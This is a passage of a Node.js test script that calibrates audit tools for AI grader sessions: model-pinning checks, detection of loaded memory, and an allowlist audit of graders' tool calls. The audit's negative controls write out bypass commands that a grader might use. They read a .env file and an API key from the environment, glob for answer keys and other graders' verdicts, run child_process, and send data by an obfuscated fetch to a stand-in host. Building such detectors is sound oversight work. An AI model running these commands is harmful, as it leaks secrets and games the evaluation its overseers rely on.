// Rule-8 calibration of the three grader-session instruments (PREREGISTER-turn-followup.md section 1, "Graders" / "Memory", I1; section 6.0):
//   h40d-grader-models.mjs (adapted: top-level sessions), check-grader-memory.mjs, audit-graders.mjs.
// Every check is run on a case whose answer is known and on the same case with the effect removed, so each is shown to answer
// DIFFERENTLY when the effect is absent. Real transcripts used (read-only; counts and verdicts printed, never a line of content):
//   a9d35e8deacac3eff  the s50l alias probe, which loaded the project memory (the registration's positive control: must read LOADED)
//   dea53624-...       a real top-level session of this project (project memory AND claude-mem SessionStart context)
//   727 subagent transcripts of this session, against an INDEPENDENT oracle: an `instructions` attachment carrying an AutoMem entry
//   addb84e6bd55778d5 ... the eight real s50l graders (each used Bash once to validate its own verdicts file)
//   011ca16e-...       the 22:19 outside-cwd alias probe (A2 point 8): a top-level session in a hashed-suffix slug folder; must read ABSENT
//                      once MEMORY.md (generic auto-memory instructions every session receives) is no longer a marker
// A2: section C is an ALLOWLIST audit (point 1) with its negative controls: the prep review's 8 bypass commands and 5 out-of-scope Read/Write
// calls must each read FLAGGED, the real shape clean, the 8 real s50l graders clean and matching the dispatch text. Run the sections alone with
//   node grader-session-calibrate.mjs --only C    (-> R/audit-graders.negative-control.out.txt)
//   node grader-session-calibrate.mjs --only B    (-> R/check-grader-memory.probe2.out.txt)
//   node grader-session-calibrate.mjs --only D    (the launcher R/launch-grader.mjs against a stand-in for the claude binary; NO model call)
//   node grader-session-calibrate.mjs --only E    (A2 point 13: the pilot's own-file absolute path; -> R/audit-graders.point13.out.txt)
//   node grader-session-calibrate.mjs --only F    (A2 point 15: the DEFAULT audit mode, graders have no Bash and no --add-dir; -> R/audit-graders.point15.out.txt)
// Point 15 (23:52) withdrew the validation-Bash allowance: sections C and E keep their --allow-validation-bash cases as the record of the withdrawn
// points 1/10/13 rules (and the real s50l/pilot transcripts that used Bash); section F is what the day's audit is held to.
// and everything with no argument. A transient file lives in a temp folder, removed at the end.
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
const HERE = path.dirname(fileURLToPath(import.meta.url));
const R = path.dirname(HERE);
const PROJECTS = 'C:/Users/sotka/.claude/projects';
const SLUG = 'C--Users-sotka-OneDrive-Masa-st--natively-cluely-ai-assistant--claude-worktrees-nifty-lederberg-49681a';
const SESSION = '9c5886c7-cdbd-48af-b8bc-e9275012ec64';
const MAIN_TOP = 'dea53624-07b8-4126-a43f-b9c49064cfff';
const PROBE = 'a9d35e8deacac3eff';
const PROBE2 = '011ca16e-5258-4124-92fb-3ea525dc85a7';
const onlyArg = process.argv.indexOf('--only');
const only = onlyArg >= 0 ? new Set(String(process.argv[onlyArg + 1]).toUpperCase().split('')) : null;
const want = (s) => !only || only.has(s);
const cli = (script, args) => { const r = spawnSync(process.execPath, [path.join(R, script), ...args], { encoding: 'utf8' }); return { code: r.status, out: `${r.stdout}${r.stderr}` }; };
let ok = true;
const check = (name, pass, detail = '') => { ok &&= !!pass; console.log(`${pass ? 'OK  ' : 'BAD '} ${name}${detail ? `  [${detail}]` : ''}`); };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'grader-cal-'));
const fx = path.join(tmp, 'projects', 'slugX');
fs.mkdirSync(path.join(fx, 'sess1', 'subagents'), { recursive: true });
const rec = (o) => JSON.stringify(o);
const assistant = (model, content = [{ type: 'text', text: 'ok' }]) => rec({ type: 'assistant', message: { role: 'assistant', model, content } });
const tool = (name, input) => ({ type: 'tool_use', id: 't', name, input });
const writeJsonl = (f, lines) => fs.writeFileSync(f, `${lines.join('\n')}\n`);

// ───────────────────────── A. h40d-grader-models.mjs (adapted) ─────────────────────────
console.log('=== A. h40d-grader-models.mjs: top-level sessions ===');
const TOP_OPUS = '11111111-1111-4111-8111-111111111111', TOP_OTHER = '22222222-2222-4222-8222-222222222222', TOP_MIXED = '33333333-3333-4333-8333-333333333333', TOP_SYNTH = '44444444-4444-4444-8444-444444444444';
writeJsonl(path.join(fx, `${TOP_OPUS}.jsonl`), [assistant('claude-opus-5-5'), assistant('claude-opus-5-5')]);
writeJsonl(path.join(fx, `${TOP_OTHER}.jsonl`), [assistant('claude-opus-4-1')]);
writeJsonl(path.join(fx, `${TOP_MIXED}.jsonl`), [assistant('claude-opus-5-5'), assistant('claude-sonnet-5-5')]);
writeJsonl(path.join(fx, `${TOP_SYNTH}.jsonl`), [assistant('claude-opus-5-5'), assistant('<synthetic>')]);
writeJsonl(path.join(fx, 'sess1', 'subagents', 'agent-abcdef0123456789.jsonl'), [assistant('claude-opus-5-5')]);
const gm = (args) => cli('h40d-grader-models.mjs', ['--projects', path.join(tmp, 'projects'), '--temp', path.join(tmp, 'notemp'), ...args]);
if (want('A')) {
    let r = gm([`probe=session:${TOP_OPUS}`]); check('top-level session on claude-opus-5-5 reads PINNED, exit 0', r.code === 0 && /PINNED/.test(r.out) && /top-level session file/.test(r.out) && !/NOT PINNED/.test(r.out));
    r = gm([`probe=session:${TOP_OTHER}`]); check('top-level session on another model reads NOT PINNED, exit 1', r.code === 1 && /NOT PINNED/.test(r.out) && /GRADER PIN NOT MET/.test(r.out));
    r = gm([`probe=session:${TOP_MIXED}`]); check('top-level session with two models reads NOT PINNED, exit 1', r.code === 1 && /NOT PINNED/.test(r.out));
    r = gm([`probe=session:${TOP_SYNTH}`]); check('a <synthetic> API-error record is counted apart and does not make it mixed, exit 0', r.code === 0 && /PINNED/.test(r.out) && /synthetic/.test(r.out));
    r = gm(['probe=session:55555555-5555-4555-8555-555555555555']); check('a top-level session with no transcript reads NOT VERIFIED, exit 1', r.code === 1 && /NO TRANSCRIPT FOUND/.test(r.out) && /NOT VERIFIED/.test(r.out));
    r = gm(['--session', 'sess1', 'g=abcdef0123456789', `probe=session:${TOP_OPUS}`]); check('a subagent (named session) and a top-level session in one call, both PINNED', r.code === 0 && /ALL GRADERS claude-opus-5-5 \(2 of 2 agents\)/.test(r.out));
    r = gm(['probe=notanid']); check('a malformed id is a usage error, exit 2', r.code === 2);
    r = cli('h40d-grader-models.mjs', ['--session', SESSION, `probe=${PROBE}`]); check(`the real alias probe ${PROBE} reads PINNED (claude-opus-5-5)`, r.code === 0 && /PINNED/.test(r.out) && !/NOT PINNED/.test(r.out));
    r = cli('h40d-grader-models.mjs', [`top=session:${MAIN_TOP}`]); check('a real top-level session of this project is found by its session file and read', /top-level session file/.test(r.out) && /claude-opus-5-5/.test(r.out) && r.code === 0);
    // A2 point 8 / list item 4: a session id is found across EVERY folder under --projects (the outside session's slug carries a hash suffix),
    // `file:<C:/ path>` is accepted, and only C:/ paths are (a Git-Bash /c/... path is refused loudly, never silently unread)
    const hashedSlug = path.join(tmp, 'projects', 'C--Users-x-scratchpad-followup-7potx7'); fs.mkdirSync(hashedSlug, { recursive: true });
    const TOP_HASHED = '66666666-6666-4666-8666-666666666666';
    writeJsonl(path.join(hashedSlug, `${TOP_HASHED}.jsonl`), [assistant('claude-opus-5-5')]);
    r = gm([`h=session:${TOP_HASHED}`]); check('a session id is found across a hashed-suffix slug folder', r.code === 0 && /PINNED/.test(r.out) && /7potx7/.test(r.out));
    r = gm([`f=file:${path.join(fx, `${TOP_OPUS}.jsonl`)}`]); check('file:<C:/ path> is accepted and read: PINNED, exit 0', r.code === 0 && /PINNED/.test(r.out) && !/NOT PINNED/.test(r.out) && /file:/.test(r.out));
    r = gm([`f=file:${path.join(fx, `${TOP_OTHER}.jsonl`)}`]); check('... a file on another model reads NOT PINNED, exit 1', r.code === 1 && /NOT PINNED/.test(r.out));
    r = gm(['f=file:/c/Users/x/y.jsonl']); check('a Git-Bash /c/... path is refused (C:/ paths only), exit 2', r.code === 2 && /C:\//.test(r.out));
    r = gm([`f=file:${path.join(fx, 'nope.jsonl')}`]); check('a file: that does not exist reads NOT VERIFIED, exit 1', r.code === 1 && /NO TRANSCRIPT FOUND/.test(r.out) && /NOT VERIFIED/.test(r.out));
    r = cli('h40d-grader-models.mjs', [`probe2=session:${PROBE2}`]); check('the real 22:19 outside-cwd probe 011ca16e (hashed-suffix slug) reads PINNED claude-opus-5-5', r.code === 0 && /PINNED/.test(r.out) && !/NOT PINNED/.test(r.out) && /7potx7/.test(r.out));
}

// ───────────────────────── B. check-grader-memory.mjs ─────────────────────────
console.log('\n=== B. check-grader-memory.mjs ===');
const { scan } = await import(new URL(`file:///${path.join(R, 'check-grader-memory.mjs').replace(/\\/g, '/')}`).href);
const probeFile = path.join(PROJECTS, SLUG, SESSION, 'subagents', `agent-${PROBE}.jsonl`);
const topFile = path.join(PROJECTS, 'C--Users-sotka-OneDrive-Masa-st--natively-cluely-ai-assistant', `${MAIN_TOP}.jsonl`);
const probeText = fs.readFileSync(probeFile, 'utf8'), topText = fs.readFileSync(topFile, 'utf8');
const mem = (file) => cli('check-grader-memory.mjs', [`t=file:${file}`]);
const countOf = (s, re) => Number((re.exec(s) ?? [])[1] ?? NaN);
if (want('B')) {
    let r = cli('check-grader-memory.mjs', ['--session', SESSION, `probe=${PROBE}`]);
    check(`POSITIVE CONTROL ${PROBE} (the s50l alias probe) reads LOADED, exit 1`, r.code === 1 && /^probe: LOADED/m.test(r.out) && countOf(r.out, /project-memory markers: (\d+) hits/) > 0);
    check('every <tag>: line carries "projectMemory=<n> claudeMem=<n>" (graders.json is derived from it, A2 point 5), and the counts equal the markers printed beside them', (() => { const m = /^probe: LOADED\s+projectMemory=(\d+) claudeMem=(\d+)/m.exec(r.out); return !!m && Number(m[1]) === countOf(r.out, /project-memory markers: (\d+) hits/) && Number(m[2]) === countOf(r.out, /claude-mem context markers: (\d+)/); })());
    // A2 point 8: MEMORY.md is NOT a marker -- every session receives the generic auto-memory instructions that name it ("add a one-line
    // pointer in MEMORY.md ..."); the project's own markers ('Memory Index', the memory file names, the memory folder path) are
    const generic = path.join(tmp, 'generic-memory-md.jsonl');
    fs.writeFileSync(generic, `${JSON.stringify({ type: 'user', message: { role: 'user', content: 'add a one-line pointer in MEMORY.md for each new memory file; keep MEMORY.md short' } })}\n`);
    const rGen = mem(generic);
    check('the generic auto-memory instruction naming MEMORY.md is NOT a marker: ABSENT, exit 0, projectMemory=0 claudeMem=0', rGen.code === 0 && /^t: ABSENT\s+projectMemory=0 claudeMem=0/m.test(rGen.out));
    const idxOnly = path.join(tmp, 'index-only.jsonl');
    fs.writeFileSync(idxOnly, `${JSON.stringify({ type: 'user', message: { role: 'user', content: '# Memory Index -- natively' } })}\n`);
    check('... while the "Memory Index" header alone still reads LOADED (projectMemory=1)', mem(idxOnly).code === 1 && /projectMemory=1 claudeMem=0/.test(mem(idxOnly).out));
    // a session id is found across a hashed-suffix slug folder (the outside session's slug ends "-followup-7potx7")
    const hs = path.join(tmp, 'projects', 'C--Users-x-scratchpad-followup-7potx7'); fs.mkdirSync(hs, { recursive: true });
    const TOP_MEM = '77777777-7777-4777-8777-777777777777';
    writeJsonl(path.join(hs, `${TOP_MEM}.jsonl`), [JSON.stringify({ type: 'user', message: { role: 'user', content: '# Memory Index' } })]);
    const rHs = cli('check-grader-memory.mjs', ['--projects', path.join(tmp, 'projects'), `h=session:${TOP_MEM}`]);
    check('session:<uuid> is found by id across a hashed-suffix slug folder (LOADED on its Memory Index header)', rHs.code === 1 && /^h: LOADED/m.test(rHs.out));
    check('file:/c/... (Git-Bash form) is refused, C:/ paths only: exit 2', cli('check-grader-memory.mjs', ['t=file:/c/Users/x/y.jsonl']).code === 2);
    // A2 point 8, recorded in R/check-grader-memory.probe2.out.txt: the positive control and the 22:19 outside-cwd probe, counts only
    const rp = cli('check-grader-memory.mjs', ['--session', SESSION, `a9d=${PROBE}`, `probe2=session:${PROBE2}`]);
    console.log(rp.out.split('\n').filter((l) => /^(a9d|probe2):/.test(l)).map((l) => `     ${l}`).join('\n'));
    check(`a9d35e8deacac3eff (positive control) still reads LOADED`, /^a9d: LOADED\s+projectMemory=\d+ claudeMem=0/m.test(rp.out));
    check(`the 22:19 outside-cwd probe ${PROBE2} reads ABSENT, projectMemory=0 claudeMem=0 (it read LOADED on the generic "MEMORY.md" hits before A2 point 8)`, /^probe2: ABSENT\s+projectMemory=0 claudeMem=0/m.test(rp.out));
    r = cli('check-grader-memory.mjs', [`top=session:${MAIN_TOP}`]);
    check('a real top-level session reads LOADED by BOTH marker groups (project memory and claude-mem context)', r.code === 1 && /^top: LOADED/m.test(r.out) && countOf(r.out, /project-memory markers: (\d+) hits/) > 0 && countOf(r.out, /claude-mem context markers: (\d+)/) > 0);

    // break the effect, structurally (by record type, not by marker text): drop the `instructions` attachment (memory + CLAUDE.md carrier)
    const dropType = (text, types) => text.split('\n').filter((l) => { if (!l.trim()) return true; try { const j = JSON.parse(l); return !(j.type === 'attachment' && types.some((t) => j.attachment?.type?.startsWith(t))); } catch { return true; } }).join('\n');
    const probeNoMem = path.join(tmp, 'probe-no-instructions.jsonl'); fs.writeFileSync(probeNoMem, dropType(probeText, ['instructions']));
    const rA = mem(probeNoMem);
    check('the positive control with its `instructions` attachment removed reads ABSENT, exit 0 (the check answers differently when the effect is absent)', rA.code === 0 && /^t: ABSENT/m.test(rA.out), rA.out.split('\n')[0].slice(0, 90));
    // the same file with ONE marker line put back must flip to LOADED
    const withMarker = path.join(tmp, 'probe-no-instructions+marker.jsonl');
    fs.writeFileSync(withMarker, `${fs.readFileSync(probeNoMem, 'utf8')}\n${JSON.stringify({ type: 'user', message: { role: 'user', content: 'see project_followup_earlier_questions.md' } })}\n`);
    check('... and one memory file NAME put back flips it to LOADED', mem(withMarker).code === 1);
    const withIdx = path.join(tmp, 'probe-no-instructions+index.jsonl');
    fs.writeFileSync(withIdx, `${fs.readFileSync(probeNoMem, 'utf8')}\n${JSON.stringify({ type: 'user', message: { role: 'user', content: '# Memory Index — x' } })}\n`);
    check('... and the "Memory Index" header put back flips it to LOADED', mem(withIdx).code === 1);
    const withCm = path.join(tmp, 'probe-no-instructions+claudemem.jsonl');
    fs.writeFileSync(withCm, `${fs.readFileSync(probeNoMem, 'utf8')}\n${JSON.stringify({ type: 'attachment', attachment: { type: 'hook_additional_context', content: ['# [grading] recent context, 2026-10-03 6:00pm GMT+3\nMode: x'] } })}\n`);
    const rCm = mem(withCm);
    check('... and a claude-mem SessionStart header (any project name) put back flips it to LOADED, naming the project', rCm.code === 1 && /claude-mem context markers: 1 \(project names in the header: grading\)/.test(rCm.out));
    const names = path.join(tmp, 'probe-no-instructions+toolnames.jsonl');
    fs.writeFileSync(names, `${fs.readFileSync(probeNoMem, 'utf8')}\n${JSON.stringify({ type: 'attachment', attachment: { type: 'skill_listing', content: '- claude-mem:babysit: x\n- claude-mem:mem-search: y mcp__plugin_claude-mem_mcp-search__search' } })}\n`);
    check('claude-mem TOOL/SKILL NAMES alone (present in every session under any cwd) do NOT read LOADED', mem(names).code === 0);

    // the top-level session: remove each carrier separately
    const topNoInstr = path.join(tmp, 'top-no-instructions.jsonl'); fs.writeFileSync(topNoInstr, dropType(topText, ['instructions']));
    const topNoHooks = path.join(tmp, 'top-no-hooks.jsonl'); fs.writeFileSync(topNoHooks, dropType(topText, ['hook_']));
    const topNone = path.join(tmp, 'top-no-instructions-no-hooks.jsonl'); fs.writeFileSync(topNone, dropType(dropType(topText, ['instructions']), ['hook_']));
    const rI = mem(topNoInstr), rH = mem(topNoHooks), rN = mem(topNone);
    const g = (o, re) => countOf(o.out, re);
    console.log(`     leftovers in the top-level session: without instructions pm=${g(rI, /project-memory markers: (\d+)/)} cm=${g(rI, /claude-mem context markers: (\d+)/)}; without hook records pm=${g(rH, /project-memory markers: (\d+)/)} cm=${g(rH, /claude-mem context markers: (\d+)/)}; without both pm=${g(rN, /project-memory markers: (\d+)/)} cm=${g(rN, /claude-mem context markers: (\d+)/)}`);
    check('top-level session minus its `instructions` attachment: the claude-mem group still reads LOADED', g(rI, /claude-mem context markers: (\d+)/) > 0 && rI.code === 1);
    check('top-level session minus its hook records: the project-memory group still reads LOADED', g(rH, /project-memory markers: (\d+)/) > 0 && rH.code === 1);
    check('top-level session minus the claude-mem hook records loses the claude-mem group (0 hits)', g(rH, /claude-mem context markers: (\d+)/) === 0);
    check('top-level session minus the `instructions` attachment loses most of the project-memory hits', g(rI, /project-memory markers: (\d+)/) < countOf(mem(topFile).out, /project-memory markers: (\d+)/));
}
if (want('B')) {   // population: 727 real subagent transcripts of this session vs an independent oracle (an `instructions` attachment with an AutoMem entry)
    const dir = path.join(PROJECTS, SLUG, SESSION, 'subagents');
    const files = fs.readdirSync(dir).filter((f) => f.endsWith('.jsonl'));
    const cm = { memLoaded: 0, memAbsent: 0, noMemLoaded: 0, noMemAbsent: 0 }, odd = [];
    for (const f of files) {
        const text = fs.readFileSync(path.join(dir, f), 'utf8');
        let oracle = false;
        for (const l of text.split('\n')) { if (!l.includes('"instructions"')) continue; try { const j = JSON.parse(l); if (j.attachment?.type === 'instructions' && (j.attachment.files ?? []).some((x) => x.type === 'AutoMem')) oracle = true; } catch { /* skip */ } }
        const loaded = scan(text).loaded;
        if (oracle && loaded) cm.memLoaded++; else if (oracle) { cm.memAbsent++; odd.push(`${f}: AutoMem entry but ABSENT`); } else if (loaded) { cm.noMemLoaded++; odd.push(`${f}: no AutoMem entry but LOADED`); } else cm.noMemAbsent++;
    }
    console.log(`     population: ${files.length} subagent transcripts; with an AutoMem entry: ${cm.memLoaded} LOADED / ${cm.memAbsent} ABSENT; without: ${cm.noMemLoaded} LOADED / ${cm.noMemAbsent} ABSENT`);
    check('the check never misses an AutoMem-loaded transcript (0 false ABSENT in the population)', cm.memAbsent === 0 && cm.memLoaded > 100);
    check('the check reads ABSENT on every transcript without an AutoMem entry except those that READ memory files through a tool', cm.noMemAbsent > 50 && cm.noMemLoaded <= 5, `${cm.noMemLoaded} such exceptions (a transcript with a Read/Bash of a memory file is exposed too)`);
    for (const f of odd.slice(0, 6)) {   // each exception must really be a tool read of memory: a tool_use input naming memory
        const text = fs.readFileSync(path.join(dir, f.split(':')[0]), 'utf8');
        let toolRead = 0;
        for (const l of text.split('\n')) { if (!l.trim()) continue; try { for (const c of JSON.parse(l).message?.content ?? []) if (c?.type === 'tool_use' && /memory|MEMORY/.test(JSON.stringify(c.input))) toolRead++; } catch { /* skip */ } }
        check(`exception ${f.split(':')[0].slice(0, 22)}: a tool call names a memory file (a real exposure, LOADED is right)`, toolRead > 0);
    }
}

// ───────────────────────── C. audit-graders.mjs: the allowlist and its negative controls (A2 point 1) ─────────────────────────
if (want('C')) {
    console.log('\n=== C. audit-graders.mjs: ALLOWLIST audit; negative controls ===');
    const SPDIR = path.dirname(path.dirname(R));                                            // the scratchpad (SP)
    const MAINDIR = 'C:/Users/sotka/OneDrive/Masaüstü/natively-cluely-ai-assistant';
    const RUBRIC = `${MAINDIR}/electron/test/golden/interview60.grader-prompt.md`;
    const B = 'C:/x/blind', XR = 'C:/x/rubric.md';                                         // a synthetic blind folder + rubric for the file: transcripts
    const baseArgs = ['--blind-dir', B, '--rubric', XR, '--no-dispatch-check'];
    const au = (lines, { tag = 'blind-1.g1', flag = true, extra = [] } = {}) => {
        const f = path.join(tmp, `audit-${Math.random().toString(36).slice(2)}.jsonl`);
        writeJsonl(f, lines);
        const r = cli('audit-graders.mjs', [...baseArgs, ...(flag ? ['--allow-validation-bash'] : []), ...extra, `${tag}=file:${f}`]);
        return { ...r, line: r.out.split('\n').find((l) => l.startsWith(tag)) ?? '' };
    };
    const own = (extraCalls = []) => [assistant('claude-opus-5-5', [tool('Read', { file_path: XR }), tool('Read', { file_path: `${B}/pairs.blind-1.json` }), tool('Write', { file_path: `${B}/verdicts.blind-1.g1.json`, content: '{}' }), ...extraCalls])];
    const bash = (cmd) => tool('Bash', { command: cmd });
    const CD = `cd "${B}" && node -e "`;
    const V = "const v=JSON.parse(require('fs').readFileSync('verdicts.blind-1.g1.json','utf8'));const p=JSON.parse(require('fs').readFileSync('pairs.blind-1.json','utf8'));";
    const flagged = (r) => r.code === 1 && /FLAGGED/.test(r.line);
    const clean = (r) => r.code === 0 && / clean/.test(r.line) && !/FLAGGED/.test(r.line);
    const show = (r) => r.line.replace(/^.*?FLAGGED \d+: /, '').slice(0, 90);

    // ── the real shape: clean ──
    let r = au(own()); check('the real shape (Read rubric + own pairs, Write own verdicts, nothing else) is clean, exit 0', clean(r), r.line.slice(0, 120));
    r = au(own([bash(`${CD}${V}console.log(Object.keys(v).length,p.items.length)"`)])); check('... plus one validation Bash of the exact shape cd "<own blind folder>" && node -e "<code>" (own verdicts + own pairs only) is clean under the flag', clean(r) && /bash=\[\d+:[0-9a-f]{12}\]/.test(r.line), r.line.slice(0, 140));
    r = au(own([bash(`node -e "const v=JSON.parse(require('fs').readFileSync(process.argv[1],'utf8'));console.log(Object.keys(v).length)" "${B}/verdicts.blind-1.g1.json"`)])); check('point 10 positive: the trailing-argument shape, own verdicts read as fs.readFileSync(process.argv[1]) (2 of the 8 real graders), is clean', clean(r), r.line.slice(0, 140));
    r = au(own([bash(`node -e "console.log(Object.keys(require(process.argv[1])).length)" "${B}/verdicts.blind-1.g1.json"`)])); check('point 10 positive: require(process.argv[1]) of the own verdicts (1 of the 8 real graders) is clean', clean(r), r.line.slice(0, 140));
    r = au(own([bash(`node -e "console.log(Object.keys(require(process.argv[1])).length)" "${B}/verdicts.blind-1.g2.json"`)])); check('... but the SAME command with the OTHER grader\'s verdicts as the trailing argument is FLAGGED', flagged(r), show(r));
    r = au(own([bash(`node -e "console.log(fs.readFileSync(process.argv[1],'utf8').length)" "${B}/pairs.blind-2.json"`)])); check('... and fs.readFileSync(process.argv[1]) with a trailing argument that is NOT the own file (another pairs file) is FLAGGED', flagged(r), show(r));
    r = au(own([bash(`node -e "console.log(fs.readFileSync(process.argv[2],'utf8').length)" "${B}/verdicts.blind-1.g1.json"`)])); check('... process.argv[2] with only ONE trailing argument (no such slot) is FLAGGED; so is process.argv[0]', flagged(r) && flagged(au(own([bash(`node -e "console.log(fs.readFileSync(process.argv[0],'utf8').length)" "${B}/verdicts.blind-1.g1.json"`)]))), show(r));
    r = au(own([bash(`${CD}${V}console.log(fs.readFileSync(process.argv[1]))"`)])); check('... process.argv[1] with NO trailing argument is FLAGGED', flagged(r), show(r));
    r = au(own([bash(`${CD}${V}console.log(Object.keys(v).length)"`)])); check('point 1 positive: the literal-name form (the 5 other real graders) stays clean', clean(r));
    r = au(own([bash(`${CD}${V}console.log(fs.existsSync('verdicts.blind-1.g1.json'),require('fs').existsSync('pairs.blind-1.json'),process.stdout.write('x'))"`)])); check('bare fs.existsSync / require(\'fs\').existsSync with the own literal, and process.stdout, are clean', clean(r), show(r));
    // the NEW negative controls of point 10 (each FLAGGED naming its clause)
    r = au(own([bash(`${CD}${V}process.chdir(path.dirname(process.cwd()));const d='keyhold';const f=d;console.log(fs.readFileSync(f,'utf8'))"`)])); check('NEGATIVE CONTROL point 10 (S3): process.chdir(path.dirname(process.cwd())) + the dot-free literal \'keyhold\' + a read by variable: FLAGGED', flagged(r), show(r));
    r = au(own([bash(`${CD}${V}console.log(path.dirname(process.cwd()))"`)])); check('NEGATIVE CONTROL point 10: path.dirname(process.cwd()) alone: FLAGGED', flagged(r), show(r));
    r = au(own([bash(`${CD}${V}for(const e of fs.opendirSync('.'))console.log(e.name)"`)])); check('NEGATIVE CONTROL point 10: fs.opendirSync(\'.\'): FLAGGED', flagged(r), show(r));
    r = au(own([bash(`${CD}const n='verdicts.blind-1.g1.json';console.log(fs.readFileSync(n,'utf8').length)"`)])); check('NEGATIVE CONTROL point 10: fs.readFileSync(n) with n a variable holding the own name: FLAGGED (first argument must be a literal or process.argv[d])', flagged(r) && /first argument/.test(r.line), show(r));
    r = au(own([bash(`${CD}${V}require('fs/promises').readFile('../run.log')"`)])); check('NEGATIVE CONTROL point 10: require(\'fs/promises\'): FLAGGED', flagged(r), show(r));
    for (const [name, code] of [['chdir alone', 'process.chdir(\'..\')'], ['__dirname', 'console.log(__dirname)'], ['process.cwd()', 'console.log(process.cwd())'], ['a token inside a string literal (point 10 (i): literals included)', 'console.log(\'chdir\')'], ['fs.writeFileSync of the own verdicts file', 'fs.writeFileSync(\'verdicts.blind-1.g1.json\',\'{}\')'], ['fs.readdirSync', 'fs.readdirSync(\'.\')'], ['fs.statSync', 'fs.statSync(\'verdicts.blind-1.g1.json\')'], ['fs[\'readFileSync\'] (bracket access)', 'fs[\'readFileSync\'](\'verdicts.blind-1.g1.json\')'], ['an alias of fs', 'const q=require(\'fs\');q.readFileSync(\'verdicts.blind-1.g1.json\')'], ['a destructured readFileSync', 'const {readFileSync}=require(\'fs\');readFileSync(\'verdicts.blind-1.g1.json\')'], ['process.env', 'console.log(process.env.X)'], ['process.argv.slice', 'console.log(process.argv.slice(1))'], ['import()', 'import(\'node:fs\')'], ['Buffer', 'console.log(Buffer.from(\'x\'))'], ['a glob word', 'console.log(\'x\'.glob)'], ['eval', 'eval(\'1\')'], ['new Function(', 'new Function(\'return 1\')()'], ['a bare child_process', 'child_process.execSync(\'dir\')'], ['another grader\'s verdicts by literal', 'fs.readFileSync(\'verdicts.blind-1.g2.json\')']]) {
        r = au(own([bash(`${CD}${code}"`)])); check(`point 10 also FLAGGED: ${name}`, flagged(r), show(r));
    }
    r = au(own(), { flag: false }); check('without the flag: Read/Write of the own files only is still clean (section 1\'s text: Read and Write)', clean(r));
    r = au(own([bash(`${CD}${V}console.log(1)"`)]), { flag: false }); check('without the flag a Bash call is FLAGGED (section 1\'s text: any tool other than Read/Write)', flagged(r) && /Bash/.test(r.line), show(r));

    // ── the prep review\'s 8 bypass commands (I2 list 1-8): each also names the grader\'s own verdicts file, each must be FLAGGED ──
    const bypass = [
        ['1 reading MAIN/.env', `${V}console.log(require('fs').readFileSync('${MAINDIR}/.env','utf8').length)`],
        ['2 R-key*/k*-1.json (a glob around keyhold)', `${V}console.log(require('fs').readFileSync('../R-key*/k*-1.json','utf8'))`],
        ['3 ../interview60.ans* (a glob)', `${V}console.log(require('fs').readFileSync('../interview60.ans*','utf8'))`],
        ['4 readdirSync(\'..\') with \'interview60.\'+\'ans\'', `${V}for(const f of require('fs').readdirSync('..'))if(f.startsWith('interview60.'+'ans'))console.log(require('fs').readFileSync('../'+f,'utf8'))`],
        ['5 ../../PREREGISTER-turn-followup.md', `${V}console.log(require('fs').readFileSync('../../PREREGISTER-turn-followup.md','utf8').length)`],
        ['6 ../run.log', `${V}console.log(require('fs').readFileSync('../run.log','utf8').length)`],
        ['7 verdicts.blind-1.g?.json (the other grader\'s verdicts, by glob)', `${V}console.log(require('fs').readFileSync('verdicts.blind-1.g?.json','utf8'))`],
        ['8 fetch(\'ht\'+\'tps://...\')', `${V}fetch('ht'+'tps://example.invalid/'+Object.keys(v).length)`],
    ];
    for (const [name, code] of bypass) {
        r = au(own([bash(`${CD}${code}"`)]));
        check(`NEGATIVE CONTROL bypass ${name}: FLAGGED`, flagged(r), show(r));
    }
    // more ways round, each FLAGGED
    const more = [
        ['template literal', V + 'console.log(' + '`x`' + ')'],
        ['$ expansion', V + 'console.log($HOME)'],
        ['a backtick', V + 'console.log(1)' + '`id`'],
        ['an absolute path literal', `${V}console.log(require('fs').readFileSync('C:/x/key.blind-1.json','utf8'))`],
        ['a ~ path', `${V}console.log(require('fs').readFileSync('~/.claude/x','utf8'))`],
        ['require of child_process', `${V}require('child_process').execSync('dir')`],
        ['process.env', `${V}console.log(process.env.GEMINI_API_KEY)`],
        ['http', `${V}require('http').get('http://example.invalid')`],
        ['a path.join with a non-literal argument', `${V}console.log(require('path').join(process.argv[1],'x'))`],
        ['readdirSync of the blind folder itself', `${V}console.log(require('fs').readdirSync('.'))`],
        ['string building with replace', `${V}console.log(require('fs').readFileSync('verdicts.blind-1.g1.json'.replace('1','2')))`],
        ['import()', `${V}import('node:child_process')`],
    ];
    for (const [name, code] of more) {
        r = au(own([bash(`${CD}${code}"`)]));
        check(`also FLAGGED: ${name}`, flagged(r), show(r));
    }
    r = au(own([bash(`cd "${B}/.." && node -e "${V}console.log(1)"`)])); check('also FLAGGED: a cd target that is not the own blind folder', flagged(r), show(r));
    r = au(own([bash(`${CD}${V}console.log(1)" ; cat ../run.log`)])); check('also FLAGGED: a second command after the node -e (; cat ../run.log)', flagged(r), show(r));
    r = au(own([bash(`${CD}${V}console.log(1)" && cat ../run.log`)])); check('also FLAGGED: && cat ../run.log after the node -e', flagged(r), show(r));
    r = au(own([bash(`cat verdicts.blind-1.g1.json pairs.blind-2.json`)])); check('NEGATIVE CONTROL `cat verdicts.blind-1.g1.json pairs.blind-2.json` (another file\'s pairs): FLAGGED', flagged(r), show(r));
    r = au(own([bash(`${CD}${V.replace('pairs.blind-1.json', 'pairs.blind-2.json')}console.log(1)"`)])); check('NEGATIVE CONTROL node -e naming pairs.blind-2.json: FLAGGED', flagged(r), show(r));

    // ── the 5 out-of-scope Read/Write calls + other tools ──
    const reads = [
        ['Read MAIN/.env', tool('Read', { file_path: `${MAINDIR}/.env` })],
        ['Read the registration', tool('Read', { file_path: `${path.dirname(R).replace(/\\/g, '/')}/PREREGISTER-turn-followup.md` })],
        ['Read R/run.log', tool('Read', { file_path: `${R.replace(/\\/g, '/')}/run.log` })],
        ['Read R/s50m-gated-turn.json', tool('Read', { file_path: `${R.replace(/\\/g, '/')}/s50m-gated-turn.json` })],
        ['Write blind/graders.json', tool('Write', { file_path: `${B}/graders.json`, content: '{}' })],
        ['Read another file\'s pairs (pairs.blind-2.json)', tool('Read', { file_path: `${B}/pairs.blind-2.json` })],
        ['Read the other grader\'s verdicts', tool('Read', { file_path: `${B}/verdicts.blind-1.g2.json` })],
        ['Write the other grader\'s verdicts', tool('Write', { file_path: `${B}/verdicts.blind-1.g2.json`, content: '{}' })],
